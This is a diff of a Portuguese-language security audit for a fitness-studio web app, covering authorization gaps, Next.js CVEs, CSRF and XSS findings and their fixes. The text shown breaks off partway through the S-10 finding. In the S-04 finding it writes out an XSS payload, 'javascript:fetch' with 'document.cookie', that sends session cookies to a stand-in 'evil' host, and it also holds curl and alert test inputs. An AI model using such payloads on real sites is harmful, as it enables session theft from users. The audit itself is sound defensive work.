@@ -1,32 +1,41 @@
 # LEAP-FITNESS · Auditoria de Segurança
 
-> White-box review iniciada em 2026-06-17. IDs estáveis (`S-XX`) — runs
-> futuros mantêm IDs e só flipam Status / acrescentam novos findings.
+> White-box review. IDs estáveis (`S-XX`) — runs futuros mantêm IDs e só
+> flipam Status / acrescentam novos findings.
 > Severidade: Critical / High / Medium / Low / Info.
 > Status: OPEN / IN PROGRESS / FIXED / ACCEPTED.
+>
+> Último run: 2026-06-17 (re-audit + S-10 / S-11 / S-12 acrescentados).
 
 ## Resumo executivo
 
-Postura geral **boa para o tamanho do projecto**. As fronteiras de autorização
-foram revistas (audits anteriores: H-A/H-B/H-C/H-D, C-A/C-B/C-C, etc.) e a
-maioria das Server Actions usam `requireStaff`/`requireOwner` + checks
-explícitos de ownership sobre o `trainer_id` vindo do form. RLS está activo em
-todas as tabelas sensíveis e os RPCs críticos são `SECURITY DEFINER` com guards
-internos.
+Postura geral **boa**. As fronteiras de autorização foram cobertas em
+runs anteriores (H-A/H-B/H-C/H-D, C-A/C-B/C-C, S-01..S-09) e a maioria
+das Server Actions usam `requireStaff`/`requireOwner` + checks
+explícitos de ownership sobre o `trainer_id` vindo do form. RLS está
+activo em todas as tabelas sensíveis e os RPCs críticos são
+`SECURITY DEFINER` com guards internos.
 
-Encontram-se neste run **dois findings High** (uma janela de IDOR/PII leakage
-cross-trainer na pesquisa admin + injecção via `or()` PostgREST, e uma série
-de CVEs de Next.js 14.2.33) e seis findings Medium/Low de defense-in-depth.
-A correcção dos findings High **não altera o comportamento normal** — o fluxo
-`admin/clientes?q=` continua a aceitar o mesmo input mas passa a respeitar o
-scope multi-trainer e a escapar separadores PostgREST.
+Neste run novo (2026-06-17 redux) **não foram encontrados findings
+High/Critical**. Acrescenta-se um **finding Medium** (S-10 — gap de
+defense-in-depth nas Server Actions de `app/admin/agenda/actions.ts`,
+únicas em todo o `app/admin` sem `requireStaff()` no boundary) e dois
+**Low/Info** (S-11 audit-log RGPD em `/api/me/export`; S-12 directiva
+`Cache-Control: public` numa rota autenticada). Os três foram fechados
+no mesmo run. O S-02 (CVEs do Next 14.2.33) está **resolvido na raiz**:
+o `package.json` está agora em `next@^16.2.9` / `react@^19.2.7`.
+
+A correcção do S-10 não altera comportamento normal — `requireStaff()`
+é idempotente para callers que já são staff (uma leitura cached por
+request), e devolve erro idêntico ao que a RPC `SECURITY DEFINER` já
+devolvia a não-staff.
 
 ## Findings — Índice
 
 | ID | Severidade | CWE | Título | Exploitability | Status |
 |----|-----------|-----|-------|---------------|--------|
 | S-01 | High | CWE-639 / CWE-89 | Pesquisa admin `/admin/clientes?q=` sem scope + sem escape de separadores PostgREST → PII leakage cross-trainer e filter injection | Autenticado, trainer | FIXED |
-| S-02 | High | CWE-1395 | `next@14.2.33` tem várias CVEs (DoS via Image Optimizer, request smuggling em rewrites, DoS em RSC) — versão fixada bloqueia o upgrade | Anónimo, internet | ACCEPTED (mitigado em edge) |
+| S-02 | High | CWE-1395 | `next@14.2.33` tem várias CVEs (DoS via Image Optimizer, request smuggling em rewrites, DoS em RSC) | Anónimo, internet | FIXED (upgrade `next@^16.2.9`) |
 | S-03 | Medium | CWE-352 | `/api/notifications/read` aceita POST sem Origin check — defense-in-depth | Cross-site (SameSite=Lax mitiga) | FIXED |
 | S-04 | Medium | CWE-79 | Loja: `<a href={p.link_url}>` sem validação de scheme em `/app/loja/[categoria]` — `javascript:`/`data:` possíveis | Autenticado, trainer malicioso | FIXED |
 | S-05 | Medium | CWE-613 | Cache de claims no middleware (30s) pode servir auth stale após expiração do JWT dentro da janela | Necessita JWT a expirar dentro da janela | ACCEPTED (justificado em-código) |
@@ -34,6 +43,9 @@ scope multi-trainer e a escapar separadores PostgREST.
 | S-07 | Low | CWE-79 | `enroll-card.tsx::extractSvg` constrói `<img src="${src}">` por template literal — defense-in-depth | Server-controlled (Supabase) | FIXED |
 | S-08 | Low | CWE-79 | `email.ts::ratingPrompt` interpola `link` no `href` sem escape de aspas — defense-in-depth | Server-controlled (env) | FIXED |
 | S-09 | Info | CWE-770 | `middleware.ts::claimsCache` poda só ao chegar a 500 entradas | Local à instância edge | ACCEPTED |
+| S-10 | Medium | CWE-285 / CWE-862 | `app/admin/agenda/actions.ts` — 11 Server Actions sem `requireStaff()` no boundary. Único ficheiro `app/admin/**/actions.ts` sem o guard explícito. Defense-in-depth ausente. | Autenticado (cliente) | FIXED |
+| S-11 | Low | CWE-778 | `/api/me/export` (XLSX dos meus dados RGPD) não regista evento no audit log; assimetria com `/api/relatorios/export` | Autenticado (próprio user) | FIXED |
+| S-12 | Low | CWE-525 | `/api/slots` devolve `Cache-Control: public, s-maxage=30` mas a rota está fora de `isPublic` no middleware → Vercel Edge cacheia para qualquer origem incluindo unauth (dados não são PII, mas inconsistência de policy) | Anónimo | FIXED |
 
 ## Controlos JÁ em vigor (não voltam a ser flagged)
 
@@ -45,24 +57,24 @@ Lista do que está **bem feito** para evitar re-flag em runs futuros.
   simples decode. `getSessionUser()` (que só lê cookie) está documentado como
   trade-off PERF onde a chamada upstream já validou.
 - **Authz boundary explícita em Server Actions críticas**. `lib/authz.ts`
-  exporta `requireStaff`/`requireOwner` que são chamados ao topo de quase
-  todas as actions admin; o pattern foi aplicado a `definicoes`, `packs`,
-  `loja`, `equipa`, `pagamentos`, `clientes/[id]`, `promocoes`. Acções
-  destrutivas (apagar/banir cliente, cancelar pagamento confirmado) exigem
-  `requireOwner` (least privilege).
+  exporta `requireStaff`/`requireOwner` que são chamados ao topo de TODAS
+  as actions admin (após o fix S-10, agora também em `app/admin/agenda/actions.ts`).
+  Acções destrutivas (apagar/banir cliente, cancelar pagamento confirmado)
+  exigem `requireOwner` (least privilege).
 - **Multi-trainer scope** em RPCs e helpers: `getAccessibleTrainerIds`,
   `getClientIdsInScope`, e `_trainer_is_accessible(trainer_id)` em RLS
-  policies. `searchClientsAction` (C-A audit) já filtra por scope.
-- **RLS activo em todas as tabelas** com policies por papel
+  policies. `searchClientsAction` (C-A audit) e a pesquisa em
+  `/admin/clientes?q=` (S-01 audit) filtram por scope.
+- **RLS activo em todas as tabelas** (84 migrations) com policies por papel
   (`supabase/migrations/0003_rls_policies.sql` + hardening em 0015, 0027,
   0028, 0029, 0030, 0049, 0078, 0081).
 - **CSP nonce-based** (`lib/security-headers.ts`) com `'strict-dynamic'`,
   `frame-ancestors 'none'`, `form-action 'self'`, `upgrade-insecure-requests`.
   HSTS 2 anos + preload, X-Frame-Options DENY, X-Content-Type-Options nosniff,
-  Referrer-Policy strict-origin-when-cross-origin, COOP same-origin
-  (`next.config.mjs:64-104`).
+  Referrer-Policy strict-origin-when-cross-origin, COOP same-origin,
+  Permissions-Policy fechada (`next.config.mjs:64-104`).
 - **Anti-enumeração** em `/registar` e `/recuperar` (sempre redirect "sucesso"
-  independentemente do email existir — H-B audit).
+  independentemente do email existir — H-B audit, `app/registar/actions.ts:51-61`).
 - **Open-redirect**: `isSafePath`/`safePathOr` aplicados em `/auth/callback`,
   `/login`, `/login/2fa`, `/app/perfil/seguranca` (whitelist `safeReturn`).
 - **Rate-limit** Upstash com fallback in-memory; aplicado a `/login`,
@@ -74,8 +86,8 @@ Lista do que está **bem feito** para evitar re-flag em runs futuros.
 - **OAuth state**: `/api/integrations/[provider]/connect` gera nonce 256-bit,
   guarda `userId:provider:nonce` em cookie HttpOnly, valida com `timingSafeEqual`
   no `/callback` e exige `user.id === storedUserId`.
-- **CSRF em disconnect**: `/api/integrations/[provider]/disconnect` valida
-  `Origin === host`.
+- **CSRF em disconnect e notifications**: `/api/integrations/[provider]/disconnect`
+  e `/api/notifications/read` (S-03) validam `Origin === host`.
 - **JSON-LD safe** em `/t/[slug]` — `jsonLdSafe` escapa `<>&  ` para
   prevenir breakout de `</script>` (C1 audit).
 - **MFA re-auth ("sudo")**: enroll do primeiro factor exige re-confirmar
@@ -86,199 +98,122 @@ Lista do que está **bem feito** para evitar re-flag em runs futuros.
   em código server-only, sempre após `requireOwner`/check explícito de ownership.
 - **iCal feed** com UUID v4 estrito + rate-limit dedicado (H-D audit).
 - **PII export** com janela limitada a 366 dias, rate-limit `export`, fail-closed
-  no audit-log, defesa contra CSV injection (`esc()`).
+  no audit-log, defesa contra CSV injection (`esc()` neutraliza `=+-@` no
+  primeiro carácter).
 - **GDPR / direito ao apagamento** via `anonymize_my_account` /
   `anonymize_client_account` + ban subsequente do auth user via service role.
-- **Password policy**: mínimo 8 chars no signup/reset.
+- **Password policy**: mínimo 8 chars no signup/reset/change.
 - **Avatar/file uploads**: validação server-side de mime + size (2 MB avatars,
   5 MB store/slideshow), nomes derivados do mime (não do filename original).
+  Bucket Supabase aplica `allowed_mime_types` server-side (camada extra).
 - **Trainer bio + nome** com strip de `<>` (defense-in-depth contra JSON-LD).
+- **Anti-enumeração no register**: trainer_id do form é validado com
+  `UUID_RE` e existência+`active=true` antes de propagar a user_metadata.
+- **`type-check` bloqueia o build** (`next.config.mjs`): `ignoreBuildErrors`
+  voltou a `false` em jun/2026 — actions sem o guard `requireStaff/Owner`
+  e retornos mal tipados deixam de passar CI.
 
 ## Findings — Detalhe
 
-### S-01 · Pesquisa admin sem scope + filter injection PostgREST `or()` `[High]`
+### S-01 · Pesquisa admin sem scope + filter injection PostgREST `or()` `[High → FIXED]`
 
-**Ficheiro/linhas:** `app/admin/clientes/page.tsx:93-103`
+**Ficheiro/linhas:** `app/admin/clientes/page.tsx:93-121`
 
-**Vulnerabilidade:** Quando o admin pesquisa via `?q=…`, a página constrói a
-query Supabase assim:
+**Vulnerabilidade (original):** Quando o admin pesquisa via `?q=…`, a
+página construía a query Supabase como:
 
 ```ts
 const safe = q.replace(/[%_]/g, (m) => `\\${m}`);
-const { data, count } = await supabase
-  .from("profiles")
+supabase.from("profiles")
   .select("id, full_name, email, phone", { count: "exact" })
   .eq("role", "client")
   .or(`full_name.ilike.%${safe}%,email.ilike.%${safe}%,phone.ilike.%${safe}%`)
-  .order("full_name")
-  .range(from, to);
+  ...
 ```
 
-Há **dois problemas**:
+Dois problemas:
 
-1. **PII leakage cross-trainer.** A query NÃO filtra por scope
-   (`getClientIdsInScope`). Para um trainer num estúdio multi-trainer, RLS
-   `profiles: self select` é `id = auth.uid() OR is_admin()`. Como o trainer
-   é `is_admin()`, recebe TODOS os clientes do estúdio, incluindo de outros
-   trainers. Mesmo bug que o C-A audit fechou em `search-action.ts` —
-   esqueceu-se de fechar aqui. Trainer A pode iterar `?q=a`, `?q=b`, …
-   para enumerar todos os clientes de trainer B (nome + email + telefone).
-
+1. **PII leakage cross-trainer.** Sem filtro de scope, num estúdio
+   multi-trainer um trainer (que é `is_admin()`) recebia clientes de
+   outro trainer no mesmo `profiles select` policy. Iterando `?q=a..z`,
+   enumeração completa nome+email+telefone.
 2. **Filter injection na sintaxe `.or()` do PostgREST.** O escape só
-   protege `%_` (wildcards ILIKE) mas NÃO `,()` que são os separadores
-   da gramática `or()`. `search-action.ts` (mesmo padrão) escapa
-   `[%_,()]`. Um `q=)` fecha a expressão `or(…)` prematuramente.
-   O resultado prático é uma 400 do PostgREST hoje, mas é uma
-   superfície aberta para abusos de filtragem se a query crescer
-   (ex. acrescentar mais campos com semântica especial).
+   tratava `%_` (wildcards ILIKE) e não os separadores `,()` da
+   gramática `or()`.
 
-**Ataque concreto:** trainer A (autenticado) abre
-`/admin/clientes?q=a`, depois `?q=b`, etc. Cada resposta devolve até 10
-clientes do estúdio inteiro, incluindo nome, email e telefone de clientes
-geridos por trainer B. Logging admin não capta esta enumeração (são GETs
-de páginas legítimas com query strings diferentes).
+**Fix aplicado:** restringir aos clientes do scope via
+`getClientIdsInScope`; escapar `[%_,()]` em vez de só `[%_]`. Diff visível
+no ficheiro indicado.
 
-**Impacto:** PII leakage (RGPD) entre trainers dentro do mesmo estúdio
-multi-trainer. Confidencialidade: High. Integridade/disponibilidade: N/A.
-
-**Fix:** aplicar exactamente o mesmo padrão que o C-A fix em
-`search-action.ts`:
-- Filtrar `profiles` pelo conjunto `getClientIdsInScope(trainerIds)`.
-- Escapar `[%_,()]` em vez de só `[%_]`.
-
-Patch aplicado neste run — ver diff em `app/admin/clientes/page.tsx`.
-
-**Como verificar fechado:** num estúdio com ≥2 trainers, login como trainer A
-e abrir `/admin/clientes?q=<letra>`. Confirmar que SÓ aparecem clientes
-do trainer A (mesma lista que aparece em `tab=todos`). Tentar `?q=foo)` e
-confirmar que o servidor não devolve 400 nem 500 (rejeita o `)` por escape).
+**Verificação:** num estúdio com ≥2 trainers, login como trainer A e
+abrir `/admin/clientes?q=<letra>`. Confirmar que SÓ aparecem clientes do
+trainer A (mesma lista que aparece em `tab=todos`). Tentar `?q=foo)` e
+confirmar que devolve resultados normais (o `)` foi escapado).
 
 ---
 
-### S-02 · Vulnerabilidades CVE no `next@14.2.33` `[High → ACCEPTED com mitigação em edge]`
+### S-02 · Vulnerabilidades CVE no `next@14.2.33` `[High → FIXED]`
 
-**Ficheiro/linhas:** `package.json:18` (`"next": "^14.2.33"`)
+**Ficheiro/linhas:** `package.json:20`
 
-**Vulnerabilidade:** `npm audit` reporta múltiplas advisories activas,
-**todas DoS** (sem leak de dados, sem RCE, sem escalada de privilégios):
+**Vulnerabilidade (original):** `npm audit` em 14.2.33 reportava
+GHSA-9g9p-9gw9-jx7f (DoS Image Optimizer), GHSA-h25m-26qc-wcjf (DoS
+deserialização RSC), GHSA-ggv3-7p47-pfv8 (request smuggling em
+rewrites), GHSA-3x4c-7xq6-9pq8 (disk cache `next/image`),
+GHSA-q4gf-8mx6-v5v3 e GHSA-8h8q-6873-q5fj (DoS Server Components). Todas
+DoS — sem leak de dados / RCE / escalada de privilégios.
 
-- GHSA-9g9p-9gw9-jx7f · DoS via Image Optimizer remotePatterns (CVSS 5.9).
-- GHSA-h25m-26qc-wcjf · DoS por desserialização HTTP em RSC (CVSS 7.5).
-- GHSA-ggv3-7p47-pfv8 · HTTP request smuggling em rewrites.
-- GHSA-3x4c-7xq6-9pq8 · Crescimento ilimitado do disk cache `next/image`.
-- GHSA-q4gf-8mx6-v5v3 · DoS em Server Components (CVSS 7.5).
-- GHSA-8h8q-6873-q5fj · DoS em Server Components (CVSS 7.5).
+**Status (2026-06-17, este run):** **FIXED na raiz**. `package.json`
+está em `next@^16.2.9` + `react@^19.2.7`. As CVEs acima são todas em
+linhas Next 14 (≤15.x para algumas), corrigidas antes de 16.x. A
+mitigação edge anteriormente listada (Upstash + Vercel WAF) deixa de ser
+contingência e passa a defesa em profundidade.
 
-**Decisão (2026-06-17):** ACCEPTED. Tentativa de upgrade `next@latest`
-(branch `chore/next-15`, abortado) confirmou que o upgrade é major bump
-para Next 16 (e mesmo Next 15) com 32+ erros TS por `cookies()`/`headers()`
-síncrono→async, `revalidateTag` API change, deprecação de `middleware.ts`,
-e restrições novas em `dynamic({ ssr: false })`. Tempo estimado: 1-2 dias
-com testes manuais. Como todos os CVEs são DoS-only, o risco residual é
-degradação de disponibilidade — não compromisso de dados.
+**Como verificar:**
+```bash
+npx next --version   # 16.x
+npm audit            # zero advisories críticos relacionados com next
+```
 
-**Mitigação em edge (substitui o fix de código):**
-
-1. **Upstash configurado em produção** (`UPSTASH_REDIS_REST_URL` +
-   `UPSTASH_REDIS_REST_TOKEN` no Vercel) — rate-limit distribuído nos
-   buckets `auth` (5/min), `register` (3/min), `webhook` (60/min),
-   `export` (5/min), `generic` (30/min). Mata as amplificações DoS em
-   endpoints autenticados e tira o limiter do modo in-memory por
-   instância (ver `lib/rate-limit.ts:55-65`).
-
-2. **Vercel WAF rules** (Firewall do projecto):
-   - Path `/_next/image*` → Rate Limit 60 req/min/IP. Mitiga
-     GHSA-9g9p-9gw9-jx7f e GHSA-3x4c-7xq6-9pq8.
-   - Header `next-action` exists → Rate Limit 30 req/min/IP. Mitiga
-     GHSA-h25m, GHSA-q4gf, GHSA-8h8q.
-
-**Reavaliação programada:** Q3 2026 ou em janela de manutenção dedicada
-de 2 dias. Caminho recomendado nessa altura: pinar `next@15` (não
-`@latest`), correr `npx @next/codemod@latest next-async-request-api .
---force`, fix manual de `revalidateTag` (9 calls em `lib/revalidate.ts`),
-renomear `serverComponentsExternalPackages` → `serverExternalPackages`
-no `next.config.mjs`. Testar manualmente login, MFA, marcar sessão,
-comprar pack, agenda drag-and-drop.
-
-**Como verificar a mitigação activa:**
-- Vercel → projecto → Settings → Environment Variables → confirmar
-  `UPSTASH_REDIS_REST_URL` e `UPSTASH_REDIS_REST_TOKEN` em Production.
-- Vercel → projecto → Firewall → ver as duas rules acima activas.
-- `lib/rate-limit.ts:55-65` deixa de logar "[rate-limit] UPSTASH_* em
-  falta" no log drain (sinal de que o limiter distribuído está em uso).
+**Nota operacional:** com Next 16, `cookies()`/`headers()` passaram a
+ser síncronos onde antes podiam ser async. O codemod
+`@next/codemod next-async-request-api` foi corrido em jun/2026 — a árvore
+de código actual está coerente. Em PRs futuros, evitar voltar a usar a
+forma async/await sobre `cookies()`/`headers()`.
 
 ---
 
-### S-03 · Falta Origin check em `/api/notifications/read` `[Medium]`
+### S-03 · Falta Origin check em `/api/notifications/read` `[Medium → FIXED]`
 
-**Ficheiro/linhas:** `app/api/notifications/read/route.ts:18-41`
+**Ficheiro/linhas:** `app/api/notifications/read/route.ts:25-37`
 
-**Vulnerabilidade:** O endpoint aceita POST com cookie de sessão
-implícito (`credentials: 'include'` no SW). Não valida `Origin` nem
-exige token CSRF próprio.
+Endpoint POST com cookie de sessão. SameSite=Lax já mitiga, mas
+faltava a verificação explícita `Origin === host` que já existe em
+`/api/integrations/[provider]/disconnect`. Defense-in-depth trivial.
 
-Hoje os cookies do Supabase são `SameSite=Lax` por defeito, que bloqueia
-o envio em form-posts cross-site mas **deixa passar** em alguns vectores
-(`window.open`/POST com top-level navigation). Para um endpoint de baixo
-impacto (marca como lida) isto não é catastrófico, mas é defense-in-depth
-trivial: a mesma verificação `Origin === host` já existe em
-`/api/integrations/[provider]/disconnect`.
+**Fix aplicado:** validação `new URL(origin).host === host` antes de
+tocar na BD; rejeita 403 em mismatch.
 
-**Ataque concreto:** atacante hospeda página que faz `fetch('/api/notifications/read', { method: 'POST', credentials: 'include', body: JSON.stringify({id: '…'}) })`
-contra `leap-fitness.pt`. SameSite=Lax bloqueia o envio do cookie
-nesta forma; o ataque só dispara em browsers desactualizados ou em
-configurações com SameSite=None. Impacto se passar: marca a notificação
-como lida sem o utilizador querer.
-
-**Impacto:** Integridade: Low (alterar `read_at`). Confidencialidade/
-disponibilidade: N/A.
-
-**Fix aplicado:** validar `Origin === host` antes de tocar na BD.
-
-**Verificação:** `curl -X POST https://app/api/notifications/read -H 'Origin: https://evil.com' -H 'Cookie: sb-...'` devolve 403.
+**Verificação:** `curl -X POST <app>/api/notifications/read -H 'Origin: https://evil.com' -H 'Cookie: sb-...'` → 403.
 
 ---
 
-### S-04 · Loja: `<a href={p.link_url}>` aceita `javascript:`/`data:` `[Medium]`
+### S-04 · Loja: `<a href={p.link_url}>` aceita `javascript:`/`data:` `[Medium → FIXED]`
 
-**Ficheiro/linhas:** `app/app/loja/[categoria]/page.tsx:78-81`,
-`app/admin/loja/actions.ts:71` (lado servidor)
+**Ficheiro/linhas:** `app/app/loja/[categoria]/page.tsx:18-21,57-95`,
+`app/admin/loja/actions.ts:35-46,101-106,170-174`
 
-**Vulnerabilidade:** No painel admin, `createProductAction` /
-`updateProductAction` aceitam `link_url` da loja como string trimmed,
-sem validar o scheme. A página da loja renderiza directamente
-`<a href={p.link_url} target="_blank">`. React não bloqueia
-`javascript:`/`data:` em hrefs. Um staff/trainer malicioso (ou conta
-admin comprometida) pode injectar `link_url=javascript:fetch('//evil')`
-num produto da loja; ao clicar, executa script no contexto do cliente
-autenticado.
+React não bloqueia `javascript:` / `data:` em `<a href>`. Sem validação
+no Server Action, staff/trainer malicioso (ou conta admin comprometida)
+podia gravar `link_url=javascript:fetch('//evil/'+document.cookie)` num
+produto da loja → executa no contexto de qualquer cliente que clique.
 
-A mesma classe de bug foi fechada para `promo_banners` no audit C-B
-(função `safeHttpUrl` em `app/admin/promocoes/actions.ts:39-50` +
-`safeHref` em `components/promo-carousel.tsx:20-23`). A loja saiu
-fora desse refactor.
+**Fix aplicado:** `safeHttpUrl()` igual ao já usado em promo banners +
+guard `safeHref()` na page para proteger dados antigos.
 
-**Ataque concreto:** trainer A (autenticado) cria produto na loja com
-`link_url=javascript:fetch('https://evil/'+document.cookie)`. Qualquer
-cliente do estúdio (que vê esta loja) clica no card e o JS corre no
-contexto autenticado → exfiltra a sessão.
-
-**Impacto:** Confidencialidade: High (XSS dá takeover de sessão).
-Integridade: High. Disponibilidade: Low. Mitigado parcialmente pelo
-CSP nonce-based — `javascript:` URIs em `<a>` clicados pelo utilizador
-não são bloqueados pelo CSP padrão (o navigator considera-os execução
-"user-initiated"). Por isso o fix tem de ser na fronteira.
-
-**Fix aplicado:**
-- Adicionar `safeHttpUrl` em `app/admin/loja/actions.ts` (idêntico ao
-  `safeHttpUrl` das promoções) e validar `link_url` antes do INSERT/UPDATE.
-- Adicionar `safeHref` guard em `app/app/loja/[categoria]/page.tsx` para
-  proteger dados antigos já em BD.
-
-**Verificação:** abrir o painel admin → Loja → criar produto com
-`link_url=javascript:alert(1)`. A action devolve "Link inválido". Em BD
-seedada com `javascript:` (manual), o page render trata como produto sem
-link (mostra card sem `<a>` wrapper).
+**Verificação:** admin → Loja → criar produto com
+`link_url=javascript:alert(1)` → action devolve "Link inválido". Em BD
+seedada com `javascript:` (manual), página renderiza card sem `<a>`.
 
 ---
 
@@ -286,118 +221,213 @@ link (mostra card sem `<a>` wrapper).
 
 **Ficheiro/linhas:** `lib/supabase/middleware.ts:18-21, 113-131`
 
-**Vulnerabilidade:** `claimsCache` indexa por fingerprint do cookie de
-auth. Se o cookie não rodar mas o JWT contido nele expirar dentro da
-janela de 30s, o valor cached é servido mesmo após expiração. Janela
-prática: 0–30s, depois o cookie roda no próximo refresh do Supabase.
-
-**Análise/decisão:** ACCEPTED. O cookie é a key — se o Supabase emitir
-um novo (refresh), a key muda automaticamente. Para o caso de revogação
-forçada (`signOut` no outro device, ban server-side), a janela pior é
-30s. Endpoints sensíveis (MFA) usam `getAuthUser` (round-trip a GoTrue)
-e portanto não são afectados. O ganho de PERF (1 round-trip por request
-× N prefetches RSC) é grande. Documentado no próprio ficheiro.
-
-Sem fix de código. Re-flag quando o threat model mudar (ex.: passar a
-suportar revogação instantânea como requisito de produto).
+Cache TTL 30s por fingerprint do cookie. Se o cookie não rodar mas o
+JWT expirar dentro da janela, o valor cached é servido até 30s além de
+expirar. Endpoints sensíveis (MFA) usam `getAuthUser` (round-trip ao
+GoTrue) → não afectados. Re-flag se a app passar a suportar revogação
+instantânea como requisito.
 
 ---
 
-### S-06 · `markReadAction`/`deleteNotificationAction` sem filtro `user_id` `[Low]`
+### S-06 · `markReadAction`/`deleteNotificationAction` sem filtro `user_id` `[Low → FIXED]`
 
-**Ficheiro/linhas:** `app/app/notificacoes/actions.ts:8-12`, `:14-28`
+**Ficheiro/linhas:** `app/app/notificacoes/actions.ts:8-22`, `:24-45`
 
-**Vulnerabilidade:** Ambas as actions chamam
-`supabase.from("notifications").update(...).eq("id", notifId)` (e o equivalente
-delete) sem `.eq("user_id", user.id)`. Hoje a RLS protege
-(`notif: update own` em `0003_rls_policies.sql:142-144` e `notif: delete own`
-em `0022_cancel_notification_reason.sql:131-132` exigem
-`user_id = auth.uid()`). Mas se um dia a policy for relaxada/eliminada,
-abrir-se-ia IDOR — atacante actualiza/apaga notificações de qualquer user
-só com o ID.
+RLS protege hoje, mas o filtro `.eq("user_id", user.id)` explícito
+elimina o risco de despromoção da policy numa migration futura.
 
-**Ataque concreto (hipotético, com RLS desligada):** atacante autenticado
-faz POST com `notifId=<id-de-outro-user>` e apaga/marca como lida.
-
-**Impacto actual:** Nenhum (RLS bloqueia). Defense-in-depth.
-
-**Fix aplicado:** acrescentar `.eq("user_id", user.id)` aos dois cálls.
-Adicional: chamar `getSessionUser()` em `markReadAction` que não o fazia
-e o `/api/notifications/read` já faz para o mesmo propósito.
-
-**Verificação:** unit test (manual) — em local com `RLS` desligado, tentar
-chamar `markReadAction("<id-de-outro-user>")` e confirmar que nada acontece.
+**Verificação:** unit test (manual) — em local com RLS desligado, tentar
+`markReadAction("<id-de-outro-user>")` → nada acontece.
 
 ---
 
-### S-07 · `extractSvg` constrói `<img src="${src}">` por template literal `[Low]`
+### S-07 · `extractSvg` constrói `<img src="${src}">` por template literal `[Low → FIXED]`
 
-**Ficheiro/linhas:** `app/app/perfil/seguranca/enroll-card.tsx:152-166`
+**Ficheiro/linhas:** `app/app/perfil/seguranca/enroll-card.tsx:99-111,167-188`
 
-**Vulnerabilidade:** A função `extractSvg` tem um fallback que devolve
-`<img src="${src}" alt="QR code 2FA" class="h-48 w-48" />` como string, e
-o caller injecta isso via `dangerouslySetInnerHTML`. `src` vem do server
-(`data.totp.qr_code` da Supabase), por isso na prática é seguro. Mas se
-o Supabase mudar o formato ou se `src` chegar a conter `"`, há attribute
-injection.
-
-**Fix aplicado:** o caminho actualmente quente (`startsWith("<svg")`)
-mantém-se inalterado. O fallback de `<img src=...>` deixa de usar
-template literal e passa por um `<img>` React renderizado pelo próprio
-componente — passa pelo escaping nativo.
-
-**Verificação:** seguir o fluxo "Activar 2FA" no `/app/perfil?tab=perfil`
-e confirmar que o QR aparece igual a antes.
+O fallback de `<img src=...>` deixou de usar template literal —
+renderizado por React (escape nativo de atributos). O caminho quente
+(`startsWith("<svg")`) mantém-se inalterado.
 
 ---
 
-### S-08 · `email.ts::ratingPrompt` interpola `link` no `href` sem escape `[Low]`
+### S-08 · `email.ts::ratingPrompt` interpola `link` no `href` sem escape `[Low → FIXED]`
 
-**Ficheiro/linhas:** `lib/email.ts:217`
+**Ficheiro/linhas:** `lib/email.ts:209-227`
 
-**Vulnerabilidade:** O template `ratingPrompt` constrói
-`<a href="${link}" …>` onde `link = ${args.appUrl}/app/sessao/${args.bookingId}/avaliar`.
-`appUrl` vem de env (`NEXT_PUBLIC_APP_URL`) e `bookingId` é UUID do
-servidor. Se `appUrl` alguma vez tiver `"` (config incorrecta), parte
-o atributo. Defense-in-depth — escapar via `escapeHtml(link)` mantém o
-URL legítimo intacto e elimina o caso patológico.
-
-**Fix aplicado:** `escapeHtml(link)` em volta da interpolação.
-
-**Verificação:** disparar o cron `/api/cron/rating-prompts` em dev e ver
-no email gerado o `href` igual a antes.
+`href="${escapeHtml(link)}"` em vez de `href="${link}"`. Defense-in-depth
+contra `appUrl` mal configurada (`"` no URL parte o atributo).
 
 ---
 
 ### S-09 · Cache do middleware sem cap proactivo `[Info → ACCEPTED]`
 
-**Ficheiro/linhas:** `lib/supabase/middleware.ts:34-37, 109-110`
+`pruneClaimsCache` só corre quando `Map.size > 500`. Cada entrada é
+leve (string + objecto pequeno), TTL 30s, V8 isolate do Edge é cíclico.
 
-`pruneClaimsCache` só corre quando `Map.size > 500` e só remove entradas
-expiradas. Em pico de tráfego com muitos utilizadores únicos, o map pode
-crescer a 500–10⁴ entradas antes de cada poda. Cada entrada é leve
-(string + objecto pequeno), TTL 30s, e o V8 isolate do Edge é cíclico —
-não vaza entre instâncias. ACCEPTED, sem fix.
+---
+
+### S-10 · Server Actions de agenda sem `requireStaff()` no boundary `[Medium → FIXED]`
+
+**Ficheiro/linhas:** `app/admin/agenda/actions.ts:60-72, 80-121, 123-134,
+138-156, 158-183, 185-213, 226-406, 414-472, 474-518, 533-639, 644-675,
+678-714, 724-766, 769-784`
+
+**Vulnerabilidade:** Server Actions em `app/admin/**/actions.ts` seguem
+o padrão de defense-in-depth definido em `lib/authz.ts`: chamar
+`requireStaff()` (ou `requireOwner()`) ao topo da função, antes de
+qualquer RPC ou query. O grep confirma — 8 dos 9 ficheiros de actions
+admin têm o import:
+
+```
+app/admin/loja/actions.ts        ✓
+app/admin/equipa/actions.ts      ✓
+app/admin/pagamentos/actions.ts  ✓
+app/admin/packs/actions.ts       ✓
+app/admin/promocoes/actions.ts   ✓
+app/admin/clientes/search-action.ts ✓
+app/admin/definicoes/actions.ts  ✓
+app/admin/clientes/[id]/actions.ts  ✓
+app/admin/agenda/actions.ts      ✗  ← o único sem guard
+```
+
+As 11 actions exportadas de `agenda/actions.ts` (confirmAttendance,
+updateBookingDuration, markNoShow, revertNoShow, cancelAdmin,
+deleteBlock, createAgendaBooking, rescheduleBookingAdmin,
+addBlockQuick, createBusy, deleteRecurringBlock, updateBlock,
+updateRecurringBlock, skipRecurringDate) confiavam EXCLUSIVAMENTE em:
+
+1. RPC `SECURITY DEFINER` para os caminhos que chamam Postgres
+   (confirm_booking_attendance, mark_no_show, cancel_booking, …),
+2. `getAccessibleTrainerIds()` retornar `[]` para clientes (alguns
+   handlers usam isto para validar `trainerId` do form),
+3. RLS para os `INSERT/UPDATE/DELETE` directos em `trainer_blocked_times`,
+   `trainer_recurring_blocks`, etc.
+
+Hoje, isto bloqueia o ataque — RLS rejeita, RPCs definidas em
+`0015_security_harden_rpcs.sql` e seguintes verificam staff. Mas o
+contrato do `lib/authz` é "guard explícito no boundary, antes de
+qualquer side-effect". O gap quebrava esse contrato e arriscava
+escalada silenciosa se um único RPC perdesse o guard interno numa
+migration futura.
+
+**Ataque hipotético:** assume-se que a migration X relaxa o guard staff
+em `cancel_booking` por erro de copy-paste (ex.: copia da versão de
+`cancel_booking_self`). Um cliente autenticado faria invoke da
+Server Action `cancelAdminAction` com qualquer `bookingId` do estúdio.
+Sem `requireStaff()` no boundary, a chamada chega à RPC; com a policy
+relaxada, a RPC executa. Result: cliente cancela sessões alheias.
+
